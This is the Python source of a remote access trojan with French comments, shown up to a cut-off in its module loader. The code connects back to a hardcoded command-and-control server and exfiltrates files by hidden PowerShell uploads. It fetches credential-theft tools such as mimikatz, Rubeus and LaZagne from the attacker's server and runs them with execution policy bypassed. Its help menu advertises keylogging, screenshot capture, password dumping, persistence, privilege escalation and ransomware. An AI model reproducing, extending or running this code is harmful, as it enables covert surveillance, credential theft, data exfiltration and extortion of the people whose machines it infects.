# ============================================
# IMPORTS
# ============================================

import os 
from os import popen as shell
from cryptography.fernet import Fernet  # Chiffrement pour ransomware
import random
import socket
import subprocess
import platform
import getpass
import threading
import pyautogui  # Capture d'écran
import datetime
from time import sleep
from pynput import keyboard  # Keylogger
from pyperclip import paste  # Récupération du presse-papier
from ctypes import *
import ctypes
import shutil
import paramiko
import signal
import requests  # Communication HTTP pour download/upload
import sys
import shlex
from portscan import PortScan  # Scan de ports

# ============================================
# CONFIGURATION RÉSEAU
# ============================================

# Buffer de réception
receive = ''

# Socket principal de connexion au serveur C2
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Adresse IP du serveur C2 (Command & Control)
myip = "10.20.10.104"

# ============================================
# CHEMINS ET PERSISTENCE
# ============================================

# Chemin de l'exécutable (pointe vers .exe si compilé avec PyInstaller)
current_exe_path = sys.executable

# Chemin absolu du script Python original
current_script_path = os.path.abspath(__file__)

# ============================================
# CONNEXION AU SERVEUR C2
# ============================================

# Boucle de reconnexion automatique au serveur C2
while True:
    try:
        s.connect((myip, 4444))
        break
    except Exception as e:
        print(f"[-] Echec de connexion\n[+] Nouvelle tentative")
        sleep(1)
        pass

# ============================================
# VARIABLES GLOBALES
# ============================================

# Caractère de retour à la ligne encodé pour les envois réseau
chariot = "\n".encode('utf-8')

# Nom d'utilisateur du système actuel
user = getpass.getuser()

# Chemins des répertoires de stockage selon l'OS
if platform.system() == "Linux":
    # Répertoire caché pour screenshots sous Linux
    AppData_Path_Screen = "/home/" + user + "/.local/share/ScreenShots_Dir"
    # Répertoire caché pour keylogs sous Linux
    AppData_Path_Keylog = "/home/" + user + "/.local/share/KeyLogs_Dir"
    AppData_Path_Keylog_File = AppData_Path_Keylog + "/keylogs.txt"
elif platform.system() == "Windows":
    # Répertoire AppData pour screenshots sous Windows
    AppData_Path_Screen = "C:\\Users\\" + user + "\\AppData\\Local\\ScreenShots_Dir"
    # Répertoire AppData pour keylogs sous Windows
    AppData_Path_Keylog = "C:\\Users\\" + user + "\\AppData\\Local\\KeyLogs_Dir"
    AppData_Path_Keylog_File = AppData_Path_Keylog + "/keylogs.txt"

# ============================================
# KEYLOGGER - VARIABLES
# ============================================

# Set des touches actuellement enfoncées
pressed_keys = set()

# Touches modificatrices (Shift, Ctrl, Alt) à tracker
modifier_keys = {
    keyboard.Key.shift, keyboard.Key.shift_r,
    keyboard.Key.ctrl_l, keyboard.Key.ctrl_r,
    keyboard.Key.alt, keyboard.Key.alt_gr
}

NUMPAD_VK_MAP = {
    96: "0", 97: "1", 98: "2", 99: "3", 100: "4",
    101: "5", 102: "6", 103: "7", 104: "8", 105: "9",
    110: ".", 107: "+", 109: "-", 106: "*", 111: "/",
}

# ============================================
# SUBPROCESS - FLAGS WINDOWS
# ============================================

# Flag pour masquer les fenêtres de subprocess sous Windows
CREATE_NO_WINDOW = 0x08000000 if os.name == "nt" else 0

# Event pour arrêter le keylogger proprement
stop_event = threading.Event()

# ============================================
# PRIVILEGE ESCALATION - TOKENS SYSTEM
# ============================================

# Token SYSTEM dupliqué et stocké globalement pour réutilisation
system_token = None

# Handle du processus SYSTEM source (ne pas fermer)
system_process_handle = None

help_menu = '''
        Available Commands:
            Basic Commands:
                cd <directory> - Change directory
                cat <file> - Read a file (PowerShell)
                exit - Exit the shell
                help - Show this help menu
                clear - Clear the screen

            Post Exploitation commands:
                Recon & Discovery:
                    sysinfo - Get system information
                    arpscan - Scan local network for devices
                    netstat or netstat <kind> - Show network connections (kind: inet, inet4, inet6, tcp, tcp4, tcp6, udp, udp4, udp6, unix)
                    listlocalusers
                    listdomainusers (Not implemented)
                    portscan [start_port] [end_port] - Scan ports on local 
                    remoteportscan <target_ip> [start_port] [end_port] - Scan ports on a remote target
                    
                File Operations:
                    search <path> <filename>/<dirname> - Search for a file or directory by name
                    download <filepath> <port> - Download a file from the target 
                    upload <filepath> <port> - Upload a file to the target 
                    zipdownload <filepath> <port> - upload a directory from user session

                Persistence Mechanisms:
                    addschedule - Add a persistence scheduled task (using tasks planner for Windows)
                    addstartup - Add a startup entry (using regedit run key for Windows)
                    rdp on/off - Enable or disable RDP access
                    createlocaluser <username> <password>/nopass - Create a local user
                    createdomainuser <username> <password>/nopass - Create a domain user
                    rdpgroupadd <username> - Add a user to the Remote Desktop Users group
                    admingroupadd local/domain <username> - Add a user to the local or domain Administrators group

                Process & Service Management:
                    ps - List running processes
                    kill <pid> - Kill a process by PID (not implemented)
                    dump <pid> - Dump process memory (not implemented)
                    migrate <pid> - Migrate to another process (not implemented)

                Credential Dump:
                    lsadump - Dump LSA secrets
                    samdump - Dump SAM database
                    dumpnav - Dump Edge/Chrome/Firefox/... passwords
    
                Privilege Escalation:
                    getprivs - Attempt to enable all privileges
                    getsystem - Attempt to elevate privileges to SYSTEM
                    whoami - check current user privileges (Display if SYSTEM for debugging)

                External Modules Management:                       
                    Loading or Running External Modules:
                        loadmodule <module_name> - Load an external module (Try to download from attacker web server)
                        loadmodule all - Load all external modules
                        runmodule <module> <args> - Run a loaded module (After having loaded it with one loadmodule command)
                            - godpotato (Might not work on all Windows versions, requires specific conditions to be met)   
                            - inveigh (Not working actually) 
                            - kekeo      
                            - lazagne   
                            - mimikatz  
                            - rubeus    
                            - sauroneye
                            - snaffler

                    Loading or Running External PWSH Modules (Tools usually built in C#/exe but as PowerShell Invoke-* scripts : file existing on drive):
                        loadpwshmodule <module_name> - Load an external pwsh module (Try to download from attacker web server)
                        loadpwshmodule all - Load all external pwsh modules
                        runpwshmodule <module> <args> - Run a loaded pwsh module with arguments (After having loaded it with one loadpwshmodule command)
                            - amsi
                            - etw   
                            - byovd
                            - bloodhound
                            - godpotato (Might not work on all Windows versions, requires specific conditions to be met)
                            - inveigh (Not working actually)
                            - mimikatz
                            - powersploit
                            - rubeus
                            - sauroneye
                            - snaffler (Pwsh version not working actually)
                            - winpeas

                    Loading or Running Obfuscated PWSH Modules (Same as loadpwshmodule but with an obfuscated version of the module for more stealthy persistence on disk):
                        loadobfpwshmodule <module_name> - Load an obfuscated version of a pwsh module (Try to download from attacker web server)
                        loadobfpwshmodule all - Load obfuscated versions of all pwsh modules
                        runobfpwshmodule <module> <args> - Run an obfuscated loaded pwsh module with arguments (After having loaded it with one loadobfpwshmodule command)
                            - amsi
                            - bloodhound
                            - etw
                            - inveigh
                            - mimikatz
                            - sauroneye
                            - winpeas (coming ASAP)

                    Loading & Running in Memory PWSH Modules (Same as loadpwshmodule but run the module in memory without writing it on disk for more stealth):
                        loadrunmempwshmodule <module> <args> - Run a loaded pwsh module in memory with arguments (After having loaded it with one loadmempwshmodule command)
                            - godpotato (Might not work on all Windows versions, requires specific conditions to be met)
                            - inveigh (Not working actually)
                            - mimikatz
                            - rubeus
                            - sauroneye
                            - snaffler (Pwsh version not working actually)

                    Loading & Running in Memory Obfuscated PWSH Modules (Same as loadobfpwshmodule but run the module in memory without writing it on disk for more stealth):
                        loadrunobfmempwshmodule <module> <args> - Run an obfuscated loaded pwsh module in memory with arguments (After having loaded it with one loadobfmempwshmodule command)
                            - mimikatz

                    Unloading External Modules:
                        removemodule <module_name> - Remove an external module
                        removemodule all - Remove all external modules
                        
                User Control:
                    getscreen - Capture and send a screenshot
                    startkeylogger - Start keylogger
                    stopkeylogger - Stop keylogger
                    av on/off - Start or stop antivirus (Not working actually)
                    fw on/off - Start or stop firewall (Not working actually)

                Ransomware Module:
                    startransom (default : C:/users/<currentuser>) or startransom <path> - Start ransomware encryption
                    stopransom (default : C:/users/<currentuser>) or stopransom <path> - Stop ransomware encryption

                Open Terminal
                    pwsh - Open a PowerShell terminal
                    cmd - Open a CMD terminal (Windows only) (not implemented)

                Default CMD commands:
                    winget (Not implemented)
'''

# ============================================
# FONCTIONS - RECONNAISSANCE SYSTÈME
# ============================================

# Récupère et envoie les informations système (OS, hostname, version, etc.)
def Get_SysInfo():
    sysinfo = ''
    uname = platform.uname()
    sysinfo += f'Operating System: {uname.system}\n'
    sysinfo += f'Hostname: {uname.node}\n'
    sysinfo += f'OS Version: {uname.version}\n'
    sysinfo += f'Release: {uname.release}\n'
    sysinfo += f'Machine Type: {uname.machine}\n'
    sysinfo += f'Processor Info: {uname.processor}\n'
    sysinfo += f'Current User: {getpass.getuser()}\n'
    sysinfo += f'Current Directory: {os.getcwd()}\n'
    s.send(chariot + sysinfo.encode('utf-8') + chariot)

def ARP_Scan ():
    news = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    from scapy.all import ARP, Ether, srp, conf
    conf.verb = 0  # Désactive les messages de log de Scapy
    interface = conf.iface  # Utilise l'interface par défaut
    #ip used by this interface
    try:
        news.connect(("8.8.8.8", 80))
        ipaddr = news.getsockname()[0]
    finally:
        news.close()


    #gather 3 first octets of the ip address to create the subnet
    subnettoscan = ".".join(ipaddr.split(".")[:3]) + ".0/24" 
    s.send(chariot + f"[ARP SCAN] Scanning subnet: {subnettoscan} on interface: {interface}\n".encode('utf-8') + chariot)

    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=subnettoscan), iface=interface, timeout=0.5, inter=0.1)

    s.send(chariot + f"[ARP SCAN]       IP      -        MAC\n".encode('utf-8') + chariot)
    for sent, received in ans:
        s.send(f"[ARP SCAN] {received.psrc} - {received.hwsrc}\n".encode('utf-8'))

    s.send(chariot + f"[ARP SCAN] Scan completed.\n".encode('utf-8') + chariot)


# Lit et envoie le contenu d'un fichier texte
def Read_File(filepath):
    try:
        with open(filepath, 'r') as file:
            content = file.read()
        s.send(chariot + content.encode('utf-8') + chariot)
    except Exception as e:
        s.send(chariot + f'Error reading file: {str(e)}'.encode('utf-8') + chariot)

# ============================================
# FONCTIONS - NETWORK SCANNING
# ============================================

# Détermine le protocole (TCP/UDP) d'une connexion
def Proto_of(conn):
    if conn.type == socket.SOCK_STREAM:
        return "TCP"
    elif conn.type == socket.SOCK_DGRAM:
        return "UDP"
    return "?"

# Formate une adresse réseau en IP:Port
def fmt_addr(addr):
    if not addr:
        return ""
    ip, port = addr
    return f"{ip}:{port}"

# Liste toutes les connexions réseau actives avec filtrage par type (TCP/UDP/IPv4/IPv6)
def NetStat(kind="inet"):
    import psutil

    rows = []
    for c in psutil.net_connections(kind=kind):
        rows.append({
            "Protocol": Proto_of(c),
            "Local Address": fmt_addr(c.laddr),
            "Foreign Address": fmt_addr(c.raddr),
            "Status": c.status,
            "PID": c.pid,
            "Process": psutil.Process(c.pid).name() if c.pid else ""

        })

    for row in rows:
        line = "{Protocol: <6} {Local Address: <22} {Foreign Address: <22} {Status: <13} {PID: <7} {Process}".format(**row)
        s.send(chariot + line.encode('utf-8'))

def list_local_users():
    import pwd
    users = pwd.getpwall()
    for user in users:
        s.send(chariot + f"{user.pw_name}\n".encode('utf-8'))
    s.send(chariot)

    # commande en powershell : Get-LocalUser | Select-Object -ExpandProperty Name
    # commande en cmd : net user

def list_domain_users():
    # Cette fonction nécessite des privilèges élevés et une configuration spécifique du domaine
    # Elle est laissée non implémentée pour éviter les erreurs sur les systèmes non-domainés
    s.send(chariot + b"[!] listdomainusers is not implemented yet.\n" + chariot)

def Port_Scan(start_port, end_port):
    import contextlib
    news = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        news.connect(("8.8.8.8", 80))
        ipaddr = news.getsockname()[0]
    finally:
        news.close()
    s.send(chariot + f"[PORT SCAN] Scanning ports from {start_port} to {end_port}...\n".encode('utf-8') + chariot)
    port_range = f"{start_port}-{end_port}"
    scanner = PortScan("127.0.0.1", port_range, thread_num=500, show_refused=False, wait_time=0.5)
    with open(os.devnull, 'w') as fnull:
        with contextlib.redirect_stdout(fnull):
            open_disovered_ports = scanner.run() 
    s.send(f"[PORT SCAN] Scan completed. Open ports:\n".encode('utf-8'))
    for port in open_disovered_ports:
        s.send(f"[PORT SCAN] [#] {ipaddr}:{port[1]}\n".encode('utf-8'))
    s.send(chariot + f"[PORT SCAN] Scan finished.\n".encode('utf-8') + chariot)

def Remote_Port_Scan(targetip, start_port, end_port):
    import contextlib
    s.send(chariot + f"[PORT SCAN] Scanning ports from {start_port} to {end_port} on Host {targetip}...\n".encode('utf-8') + chariot)
    port_range = f"{start_port}-{end_port}"
    scanner = PortScan(targetip, port_range, thread_num=500, show_refused=False, wait_time=2)
    with open(os.devnull, 'w') as fnull:
        with contextlib.redirect_stdout(fnull):
            open_disovered_ports = scanner.run() 
    s.send(f"[PORT SCAN] Scan completed. Open ports:\n".encode('utf-8'))
    for port in open_disovered_ports:
        s.send(f"[PORT SCAN] [#] {targetip}:{port[1]}\n".encode('utf-8'))
    s.send(chariot + f"[PORT SCAN] Scan finished.\n".encode('utf-8') + chariot)

# ============================================
# FONCTIONS - TRANSFERT DE FICHIERS
# ============================================

# Télécharge un fichier depuis le serveur C2 via HTTP
def Download_File(filename):

    s.send(chariot + f"[DOWNLOAD] Downloading file {filename}...\n".encode('utf-8') + chariot)
    payload = f"""
    $filename = "{os.path.basename(filename)}"
    $destination = "$(Get-Location)/" + $filename
    $url = "http://{myip}/download/" + $filename
    Invoke-WebRequest -Uri $url -OutFile $destination
    """
    results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
    output = results.stdout.read() + results.stderr.read()
    s.send(f"[DOWNLOAD] File {filename} download completed.\n".encode('utf-8') + chariot)

# Upload un fichier vers le serveur C2 via HTTP PUT
def Upload_File(path_to_upload):

    s.send(chariot + f"[UPLOAD] Uploading file {os.path.basename(path_to_upload)}...\n".encode('utf-8') + chariot)
    payload = f"""
    $filename = "{os.path.basename(path_to_upload)}"
    $path = "{path_to_upload}"
    $url = "http://{myip}/upload/" + $filename
    Invoke-WebRequest -Uri $url -Method Put -InFile $path
    """
    results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
    try:
        out, err = results.communicate(timeout=20)  # évite blocage infini
    except subprocess.TimeoutExpired:
        results.kill()
        out, err = results.communicate()
        s.send(f"[UPLOAD] Timeout pendant l'upload de {os.path.basename(path_to_upload)}\n".encode("utf-8") + chariot)
        return

    s.send(f"[UPLOAD] File {os.path.basename(path_to_upload)} upload completed.\n".encode("utf-8") + chariot)

# Compresse un fichier ou répertoire en ZIP puis l'upload (optimise les gros fichiers comme lsass.dmp)
def ZIP_Upload(path_to_compress):

    s.send(chariot + f"[ZIPUPLOAD] Compressing and uploading {os.path.basename(path_to_compress)}...\n".encode('utf-8') + chariot)
    # Déterminer si c'est un fichier ou un répertoire
    if os.path.isfile(path_to_compress):
        # Pour un fichier: compresser directement le fichier
        compress_path = f'"{path_to_compress}"'
        # Le .zip aura le même nom que le fichier (sans extension originale)
        base_name = os.path.splitext(os.path.basename(path_to_compress))[0]
    elif os.path.isdir(path_to_compress):
        # Pour un répertoire: compresser tout son contenu
        compress_path = f'"{path_to_compress}\\*"'
        base_name = os.path.basename(path_to_compress)
    else:
        s.send(chariot + f"[ZIPUPLOAD] Error: Path not found: {path_to_compress}\n".encode('utf-8') + chariot)
        return
    
    # Chemin du fichier zip de destination
    zip_destination = os.path.join(os.path.dirname(path_to_compress) or ".", f"{base_name}.zip")
    
    payload = f"""
    $sourcePath = {compress_path}
    $zipPath = "{zip_destination}"
    $filename = "{base_name}.zip"
    if (Test-Path $zipPath) {{ Remove-Item $zipPath -Force }}
    Compress-Archive -Path $sourcePath -DestinationPath $zipPath -CompressionLevel Optimal
    $url = "http://{myip}/upload/" + $filename
    Invoke-WebRequest -Uri $url -Method Put -InFile $zipPath
    Remove-Item $zipPath -Force
    """
    
    results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
    output = results.stdout.read() + results.stderr.read()
    s.send(f"[ZIPUPLOAD] Zip {base_name}.zip upload completed.\n".encode('utf-8') + chariot)

# ============================================
# FONCTIONS - UTILITAIRES
# ============================================

# Envoie une séquence ANSI pour nettoyer l'écran du terminal distant
# Clear Screen function 
def Clear_Screen():
    """Send an ANSI clear-screen escape sequence back to the controller so
    the controller's terminal is cleared instead of the target's terminal.
    """
    # ANSI: clear screen (J) and move cursor to home (H)
    escape = '\x1b[2J\x1b[H'.encode('utf-8')
    try:
        s.send(chariot + escape + chariot)
    except Exception:

        # Fallback: send a plain message prompting the operator to clear
        s.send(chariot + b"[CLEAR]\n" + chariot)

# ============================================
# SIGNAL HANDLERS
# ============================================

# Gestionnaire pour CTRL+C et SIGTERM - ferme proprement la connexion
# Handle CTRL+C and SIGTERM to stop the script
def handle_exit(signum, frame):
    print("\n[!] Script stopped by user (signal: {}), exiting...".format(signum))
    try:
        s.close()
    except Exception:
        pass
    exit(0)

# Enregistrement des gestionnaires de signaux pour arrêt propre
signal.signal(signal.SIGINT, handle_exit)   # CTRL+C
signal.signal(signal.SIGTERM, handle_exit)  # kill/terminate

# ============================================
# FONCTIONS - RECHERCHE FICHIERS
# ============================================

# Recherche récursive de fichiers/répertoires par nom avec coloration
def Search_File(pathtosearch, filedirname):
    s.send(chariot + f"Searching for '{filedirname}' in '{pathtosearch}'...\n".encode('utf-8'))
    matches = []
    filedirname = filedirname.lower()
    for root, dirs, files in os.walk(pathtosearch):
        for dir in dirs:
            if filedirname in dir.lower():
                colored_dir = dir.replace(filedirname, f'\033[91m{filedirname}\033[0m')
                full_path = os.path.join(root, colored_dir)
                matches.append(full_path)
        for file in files:
            if filedirname in file.lower():
                colored_file = file.replace(filedirname, f'\033[91m{filedirname}\033[0m')
                full_path = os.path.join(root, colored_file)
                matches.append(full_path)
    if matches:
        for match in matches:
            s.send(f"Found: {match}\n".encode('utf-8'))
    else:
        s.send(chariot + f"No matches found for '{filedirname}' in '{pathtosearch}'.\n".encode('utf-8'))
    s.send(chariot)

# ============================================
# FONCTIONS - GESTION MODULES EXTERNES
# ============================================

# Télécharge et installe des modules externes (mimikatz, powersploit, rubeus, etc.)
def Load_Module(module_name):
    current_path = os.getcwd()
    if module_name == "all":
        s.send(chariot + f"[LOADMODULE] Loading ALL modules...\n".encode('utf-8'))
        Load_Module("mimikatz")
        Load_Module("rubeus")
        Load_Module("lazagne")
        Load_Module("kekeo")
        Load_Module("sauroneye")
        Load_Module("inveigh")
        Load_Module("snaffler")
        Load_Module("godpotato")
        s.send(chariot + b"[LOADMODULE] All modules loaded.\n" + chariot)
    elif module_name == "mimikatz":
        global mimikatztodelete, mimikatztoexecute
        mimikatztodelete = current_path + "\\MIMIKATZ\\"
        mimikatztoexecute = current_path + "\\MIMIKATZ\\x64\\mimikatz.exe"
        payload = f"""
        $url = "http://{myip}/download/MIMIKATZ/x64_32/mimikatz.zip"
        $destination = "$(get-location)/mimikatz.zip"
        Invoke-WebRequest -Uri $url -OutFile $destination
        Expand-Archive -Path $destination -DestinationPath "$(get-location)/MIMIKATZ"
        Remove-Item $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMODULE] Mimikatz module loaded.\n" + chariot)
    elif module_name == "rubeus":
        global rubeustodelete, rubeustoexecute
        rubeustodelete = current_path + "\\RUBEUS\\"
        rubeustoexecute = current_path + "\\RUBEUS\\Rubeus-1.6.4\\Rubeus\\bin\\Debug\\Rubeus.exe"
        payload = f"""
        $url = "http://{myip}/download/RUBEUS/x64_32/Rubeus.zip"
        $destination = "$(get-location)/Rubeus.zip"
        Invoke-WebRequest -Uri $url -OutFile $destination
        Expand-Archive -Path $destination -DestinationPath "$(get-location)/RUBEUS"
        Remove-Item $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMODULE] Rubeus module loaded.\n" + chariot)
    elif module_name == "lazagne":
        global lazagnetodelete, lazagnetoexecute
        lazagnetodelete = current_path + "\\LAZAGNE\\"
        lazagnetoexecute = current_path + "\\LAZAGNE\\LaZagne.exe"
        payload = f"""
        $url = "http://{myip}/download/LAZAGNE/x64_32/LaZagne.zip"
        $destination = "$(get-location)/LaZagne.zip"
        Invoke-WebRequest -Uri $url -OutFile $destination
        Expand-Archive -Path $destination -DestinationPath "$(get-location)/LAZAGNE"
        Remove-Item $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMODULE] LaZagne module loaded.\n" + chariot)
    elif module_name == "kekeo":
        global kekeotodelete, kekeotoexecute
        kekeotodelete = current_path + "\\KEKEO\\"
        kekeotoexecute = current_path + "\\KEKEO\\kekeo.exe"
        payload = f"""
        $url = "http://{myip}/download/KEKEO/x64_32/Kekeo.zip"
        $destination = "$(get-location)/Kekeo.zip"
        Invoke-WebRequest -Uri $url -OutFile $destination
        Expand-Archive -Path $destination -DestinationPath "$(get-location)/KEKEO"
        Remove-Item $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMODULE] Kekeo module loaded.\n" + chariot)
    elif module_name == "sauroneye":
        global sauroneyetodelete, sauroneyetoexecute
        sauroneyetodelete = current_path + "\\SAURONEYE\\"
        sauroneyetoexecute = current_path + "\\SAURONEYE\\SauronEye.exe"
        payload = f"""
        $url = "http://{myip}/download/SAURONEYE/x64_32/SauronEye.zip"
        $destination = "$(get-location)/SauronEye.zip"
        Invoke-WebRequest -Uri $url -OutFile $destination
        Expand-Archive -Path $destination -DestinationPath "$(get-location)/SAURONEYE"
        Remove-Item $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMODULE] SauronEye module loaded.\n" + chariot)
    elif module_name == "inveigh":
        global inveightodelete, inveightoexecute
        inveightodelete = current_path + "\\INVEIGH\\"
        inveightoexecute = current_path + "\\INVEIGH\\Inveigh.exe"
        payload = f"""
        $url = "http://{myip}/download/INVEIGH/x64_32/Inveigh.zip"
        $destination = "$(get-location)/Inveigh.zip"
        Invoke-WebRequest -Uri $url -OutFile $destination
        Expand-Archive -Path $destination -DestinationPath "$(get-location)/INVEIGH"
        Remove-Item $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMODULE] Inveigh module loaded.\n" + chariot)
    elif module_name == "snaffler":
        global snafflertodelete, snafflertoexecute
        snafflertodelete = current_path + "\\SNAFFLER\\"
        snafflertoexecute = current_path + "\\SNAFFLER\\Snaffler.exe"
        payload = f"""
        $url = "http://{myip}/download/SNAFFLER/x64_32/Snaffler.zip"
        $destination = "$(get-location)/Snaffler.zip"
        Invoke-WebRequest -Uri $url -OutFile $destination
        Expand-Archive -Path $destination -DestinationPath "$(get-location)/SNAFFLER"
        Remove-Item $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMODULE] Snaffler module loaded.\n" + chariot)
    elif module_name == "godpotato":
        global godpotatotodelete, godpotatotoexecute
        godpotatotodelete = current_path + "\\GODPOTATO\\"
        godpotatotoexecute = current_path + "\\GODPOTATO\\GodPotato"
        payload = f"""
        $url = "http://{myip}/download/GODPOTATO/x64_32/GodPotato.zip"
        $destination = "$(get-location)/GodPotato.zip"
        Invoke-WebRequest -Uri $url -OutFile $destination
        Expand-Archive -Path $destination -DestinationPath "$(get-location)/GODPOTATO"
        Remove-Item $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADMODULE] GodPotato module loaded.\n" + chariot)


def Load_Pwsh_Module(module_name):
    current_path = os.getcwd()
    if (module_name == "all"):
        s.send(chariot + f"[LOADPWSHMODULE] Loading ALL PWSH modules ...\n".encode('utf-8'))
        Load_Pwsh_Module("mimikatz")
        Load_Pwsh_Module("rubeus")
        Load_Pwsh_Module("powersploit")
        Load_Pwsh_Module("winpeas")
        Load_Pwsh_Module("bloodhound")
        Load_Pwsh_Module("amsi")
        Load_Pwsh_Module("etw")
        Load_Pwsh_Module("byovd")
        Load_Pwsh_Module("sauroneye")
        Load_Pwsh_Module("godpotato")
        Load_Pwsh_Module("inveigh")
        Load_Pwsh_Module("snaffler")
        s.send(chariot + b"[LOADPWSHMODULE] All PWSH modules loaded.\n" + chariot)
    elif module_name == "mimikatz":
        global mimikatztoexecute, mimikatztodelete
        mimikatztodelete = current_path + "\\MIMIKATZ\\"
        mimikatztoexecute = current_path + "\\MIMIKATZ\\Invoke-Mimikatz.ps1"
        payload = f"""
        New-Item -Path "$(get-location)/MIMIKATZ" -ItemType Directory -Force
        $url = "http://{myip}/download/MIMIKATZ/pwsh/Invoke-Mimikatz.ps1"
        $destination = "$(get-location)/MIMIKATZ/Invoke-Mimikatz.ps1"
        Invoke-WebRequest -Uri $url -OutFile $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADPWSHMODULE] Mimikatz module loaded.\n")
        s.send(b"[LOADPWSHMODULE] Usage example: runpwshmodule mimikatz 'vault::cred'\n")
        s.send(b"[LOADPWSHMODULE] Usage example: runpwshmodule mimikatz 'privilege::debug token::elevate'\n" + chariot)
    elif module_name == "rubeus":
        global rubeustoexecute, rubeustodelete
        rubeustodelete = current_path + "\\RUBEUS\\"
        rubeustoexecute = current_path + "\\RUBEUS\\Invoke-Rubeus.ps1"
        payload = f"""
        New-Item -Path "$(get-location)/RUBEUS" -ItemType Directory -Force
        $url = "http://{myip}/download/RUBEUS/pwsh/Invoke-Rubeus.ps1"
        $destination = "$(get-location)/RUBEUS/Invoke-Rubeus.ps1"
        Invoke-WebRequest -Uri $url -OutFile $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADPWSHMODULE] Rubeus module loaded.\n")
        s.send(b"[LOADPWSHMODULE] Usage example: runpwshmodule rubeus help\n")
        s.send(b"[LOADPWSHMODULE] Usage example: runpwshmodule rubeus logonsession /current\n" + chariot)
    elif module_name == "powersploit":
        global powersploittodelete, powersploittoexecute
        powersploittodelete = current_path + "\\POWERSPLOIT\\"
        powersploittoexecute = current_path + "\\POWERSPLOIT\\PowerSploit.psm1"
        payload = f"""
        $url = "http://{myip}/download/POWERSPLOIT/PowerSploit.zip"
        $destination = "$(get-location)/POWERSPLOIT/PowerSploit.zip"
        Invoke-WebRequest -Uri $url -OutFile $destination
        Expand-Archive -Path $destination -DestinationPath "$(get-location)/POWERSPLOIT"
        Remove-Item $destination
        """
        results = subprocess.Popen(["powershell", "-WindowStyle", "Hidden", "-ExecutionPolicy", "Bypass", "-Command", payload], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE, creationflags=CREATE_NO_WINDOW)
        output = results.stdout.read() + results.stderr.read()
        s.send(chariot + b"[LOADPWSHMODULE] PowerSploit module loaded.\n" + chariot)
    elif module_name == "winpeas":
        global winpeastodelete, winpeastoexecute
        winpeastodelete = current_path + "\\WINPEAS\\"
        winpeastoexecute = current_path + "\\WINPEAS\\winPEAS.ps1"
        payload = f"""
        New-Item -Path "$(get-location)/WINPEAS" -ItemType Directory -Force
        $url = "http://{myip}/download/WINPEAS/winPEAS.ps1"
        $destination = "$(get-location)/WINPEAS/winPEAS.ps1"
        Invoke-WebRequest -Uri $url -OutFile $destination
        """
